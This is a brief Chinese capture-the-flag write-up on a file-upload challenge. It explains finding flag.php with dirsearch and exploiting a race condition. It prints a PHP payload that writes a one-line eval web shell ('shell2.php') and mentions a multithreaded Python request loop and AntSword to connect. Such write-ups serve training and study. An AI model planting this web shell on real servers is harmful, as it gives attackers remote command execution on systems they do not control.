### wzsc_文件上传



最开始不知道是条件竞争的题，

dirsearch之后发现了flag.php和upload文件夹，

除了php的文件好像都可以上传上去，所以思路大致是上传一个php，在执行的时候让他写到另一个php一句话木马，从而实现访问

所以写一个php为



```
<?php fputs(fopen("shell2.php","w"),'<?php @eval($_POST["cmd"]); ?>');
phpinfo(); ?>
```

然后再写一个python的多线程访问，只要get到了就可以写入文件了，写的shell2.php用antsword直接连